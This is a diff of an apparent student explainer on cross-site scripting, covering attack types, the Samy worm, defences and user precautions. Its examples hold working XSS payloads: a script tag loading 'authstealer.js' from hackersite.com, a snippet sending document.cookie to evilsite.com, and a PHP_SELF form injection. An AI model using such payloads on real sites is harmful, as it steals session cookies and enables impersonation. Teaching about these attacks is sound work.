@@ -5,7 +5,7 @@ Introduction
 ------------
 
 
-Cross-site scripting is when an attacker inserts code into a legitimate website, 
+Cross-site scripting is when an attacker inserts code into a legitimate website 
 and is considered one of the more dangerous website vulnerabilities. Web sites are 
 vulnerable  when they don't use validation or encoding on user generated 
 data. This is dangerous for the site users, who are at risk for their data being 
@@ -16,58 +16,78 @@ as using anti-viruses, checking that the sites they are using are safe, and bein
 careful of clicking on unknown links.  
 
 
-What is Cross-site scripting and Why is it Dangerous?
+What is Cross-Site Scripting and Why is it Dangerous?
 -----------------------------------------------------
 
 
-* XSS, or Cross-Site Scripting is inserting malicious code into an actual website 
-  to gather information from the users. 
-
-* Most of the danger lies on the users of the sites, as the code targets their information 
-  and use rather than the website itself. [xss]_ 
+XSS, or Cross-Site Scripting is inserting malicious code into an actual website 
+to gather information from the users. Most of the danger lies on the users of the 
+sites, as the code targets their information and use rather than the website itself. [XSS]_ 
 
 
 * Some examples of what dangerous XSS could do include: 
 
 	1. Access session cookies, which can be used to impersonate the user
-	2. Keylogging, which tracks the users keystrokes to catch usernames and passwords
-	3. Phishing, or sending out fake and/or malicious emails
+	2. Keylogging, which tracks the users keystrokes to catch usernames and passwords, 
+	    
+	3. Phishing, or sending out fake and/or malicious emails, usually to steal user 
+	   data such as usernames and passwords. 
 	4. Installing malicious software or viruses on the user's computer
 	5. and Identity Theft [xss]_
 	
+These attacks can be damaging if the attacker manages to steal a user's username and/or 
+password. They can be used to get into user accounts and either use their accounts as 
+dummy accounts to send out other attacks, steal the users private, saved information, 
+or could be used to purchase items in the users's name if their purchasing information is 
+included in the account, such as an Amazon Prime or credit card account.
+	
 * There are two different types of XSS attacks, stored and reflective
 
-	* Stored xss is "stored", or imbedded, on the website itself and steals data every time 
+	* Stored XSS is "stored", or imbedded, on the website itself and steals data every time 
 	  the website is visited. [xss-prevention]_ It is also known as "persistent XSS", 
 	  and can be the more dangerous of the two types. [xss-attacks]_
 
-	* Reflective xss is stored in a link embedded in the website that the user has to 
+	* Reflective XSS is stored in a link embedded in the website that the user has to 
 	  click on to activate. [xss-attacks]_ 
  
   
-* XSS attacks have been around since the start of the web, first becoming a problem when 
-  JavaScript langauage was introduced to the web application world. [Grossman]_
+XSS attacks have been around since the start of the web, first becoming a problem when 
+JavaScript language was introduced to the web application world. [Grossman]_
 
 * One of the earliest XSS worms was known as "Samy", which was a small code that 
   a 19 put in his MySpace profile to add anyone who viewed his profile as a friend. 
-  But it also added the code invisible to everyone who viewed it, and quickly 
-  multiplied exponentially, adding over one million friend requests in just over  
+  But it also added the code invisible to everyone who viewed his page, and it 
+  quickly multiplied exponentially, adding over one million friend requests in just over  
   24 hours before MySpace took the website down. [Grossman]_ [Franceschi]_ 
 
 What Can Be Done to Prevent XSS through Web Security
 ----------------------------------------------------
 	
-* Web Application Firewall (WAF) - most common protection [xss-attacks]_ 
+* Web Application Firewall (WAF) - the most common protection [xss-attacks]_ 
+	
+	* Many web browsers now come with built-in defenses against some XSS attacks. 
+	  This mostly works on reflective XSS, as the browsers can detect when common attack 
+	  senarios are run, and can neutralize them even if the user clicks on the link 
+	  itself. [Shema]_
 	
 * Signature based Filtering - "identifies and blocks malicious requests" [xss-attacks]_ 
 	
 * Use escape characters -  escape any characters that could change the websites code [xss-prevention]_ 
 	
-	* PHP Applications can use **htmlentities()** , a built in function for 
+	* PHP Applications can use ``htmlentities()`` , a built in function for 
 	  escaping characters 
 	
 	* Also escape any HTML, attribute, JavaScript, JSON (with HTML), CSS, and URL 
-	  before entering any untrusted or un-validated data [xss_cheat_sheet]_
+	  before entering any un-trusted or un-validated data [xss_cheat_sheet]_
+	  
+	* One way to do this is to use regular expressions to validate data that is entered. 
+	  Regular expressions often include escape characters that would be allowed, such as 
+	  ``\.`` for "." Regular expressions can also be used to find special characters 
+	  and escape them with a special sequences  such as ``&amp;`` for &. [Watts]_  
+	  
+	* Many browers use a *blacklist* or a *whitelist* with regular expressions. 
+	  The *blacklist* looks for matches to disallowed data, while the *whitelist* 
+	  matches valid data. [Shema]_ 
 	
 * Escape data output, not input - when displaying to user [xss-prevention]_ 
 
@@ -77,24 +97,44 @@ What Can Be Done to Prevent XSS through Web Security
 * Avoid using straight HTML - use a markup language, such as Markdown or 
   ReStructuredText
 
-* If HTML is needed, such as on blogging site, use a library such as HTML Purifier 
-  to help validate the HTML [xss-prevention]_ 
+* If HTML is needed, such as on blogging site where users may expect the ability 
+  to use HTML on their personal blogs and/or comments, use a library such as HTML 
+  Purifier to help validate the HTML [xss-prevention]_ 
 
 
 What You Can Do To Spot/Prevent XSS
 ---------------------------
 
-* Be careful of links that you click on in websites and through emails. 
+* Be careful of links that you click on in websites and through emails. Phishing 
+  attacks are usually heard coming through emails, and happen when the user clicks on a 
+  link that leads them to a malicious website. 
+  
+	* For example, if you get an email saying that your password/username has expired 
+	  or needs to be changed, the safest option is to go to a new tab and go to the 
+	  website yourself to see if the password/username really needs changed, and if 
+	  it does, you can change it through the website itself. 
+	  
+	* The same process should be used if you get an email saying that your shipping 
+	  or billing information needs to be updated for an online order. 
 
-* Make sure that websites that you are visiting are safe
+* Make sure that websites that you are visiting are safe, or take precautions before 
+  or while you are on the website. 
+  
+	* Some anti-viruses, such as Norton and Kaspersky, come with web add-ons that will 
+	  check out websites when you google them. For Kaspersky, this can show up as a 
+	  green tag with a K inside next to websites that it has verified are safe to 
+	  visit, a grey version next to links that it cannot verify, and a red version for 
+	  links that are deemed dangerous. 
 
 * Have a good Anti-Virus/ Web Security, such as McAfee AntiVirus Plus, Bitdefender 
-  AnitVirus Plus, or Kaspersky Anti-Virus
+  AnitVirus Plus, or Kaspersky Anti-Virus. As shown above, these can protect you from 
+  malicious links while googling, but they can also protect the user from phishing 
+  and keylogging attempts.  
 
 Example of Cross-Site Scripting:
 -------------------------------
 
-.. figure:: sorted-XSS.png
+.. figure:: stored_XSS.png
 
 	Stored XSS [xss-attacks]_ 
 
@@ -104,16 +144,49 @@ Example of Cross-Site Scripting:
   
   "Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>" [xss-attacks]_
   
-  This is a stored in the website, and every time someone visits the page, they have their 
-  session cookies stolen
+  This is stored in the website, and every time someone visits the page, they can 
+  have their session cookies stolen. 
 
 
-	* Harder for hackers to attempt, because they must find a highly trafficked site that 
-	  also has a security hole. [xss-prevention]_
+	* However, this is harder for hackers to attempt, because they must find a 
+	  highly trafficked site that also has a security hole that they can infiltrate. [xss-prevention]_
+
+* Another Stored XSS example would be: 
+
+	* Vulnerability: ``<div id="profile"><?php echo $user['profile']; ?></div>``
+	  This only works if the profile is pulled from a database with no escapeing 
+	  (discussed above) to protect it. The following script will show how this 
+	  vulnerability could be used to steal the user's cookies. This would allow 
+	  the hacker to impersonate the user who looked at the website. [xss-attacks]_ 
+	 
+	* Attack: 
 	
+	  ``<script>``
+	  
+		``window.open("http://evilsite.com/cookie_stealer.php?cookie=" + document.cookie, "_blank");``
+		
+	  ``</script>``
+
 	
-* Reflective XSS: Similar to above, but the user would have to click on the link 
+* Reflective XSS: Similar to the first stored example above, except that the user would have to click on the link 
   to activate the code. 
+  
+* Another reflectve XSS example would be: 
+
+	* Vulnerability: ``<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">`` 
+	  All the attacker needs to do in this case is get the user to click on the link 
+	  shown below, and an alert saying "XSS"(code) will pop up.  [xss-attacks]_  	  
+	
+	* Attack:
+	
+	  Link: ``/form.php?%22%20onload%3D%22alert(%27XSS%27)%3B``
+	  
+	  Code: ``<form action="/form.php?" onload="alert('XSS');" method="post">`` 
+	  
+In real life, this would almost certainly do more harm than a simple pop-up. Some 
+examples would be popping up a new form for you to fill out, that would sent the 
+data to the hackers, or showing an error with a message saying you need to download 
+their specific "software" (most likely malware) to get rid of the error.
 
 
 Sources
@@ -125,7 +198,11 @@ Sources
 
 .. [Franceschi] Franceschi-Bicchierai, Lorenzo. "`The MySpace Worm that Changed the Internet Forever. <https://motherboard.vice.com/en_us/article/the-myspace-worm-that-changed-the-internet-forever>`_." Motherboard. Motherboard, 04 Oct. 2015. Web. 23 Feb. 2017. 
 
-.. [Grossman] Grossman, Jeremiah. XSS Attacks: Cross-site Scripting Exploits and Defense. N.p.: Syngress, 2007. Print. 
+.. [Grossman] Grossman, Jeremiah. *XSS Attacks: Cross-site Scripting Exploits and Defense*. N.p.: Syngress, 2007. Print. 
+
+.. [Shema] Shema, Mike. “HTML Injection & Cross-Site Scripting (XSS).” *Hacking Web Apps: Detecting and Preventing Web Application Security Problems* , Syngress, 2012, pp. 23–78.
+
+.. [Watts] Watt, Andrew. *Beginning Regular Expressions*. Indianapolis , IN, Wiley, 2005. Print.  
 
 .. [xss] "`What is Cross-Site Scripting and How Can You Fix it? <https://www.acunetix.com/websitesecurity/cross-site-scripting/>`_." Acunetix. Acunetix. n.d. Web. 16 Feb. 2017. 
 
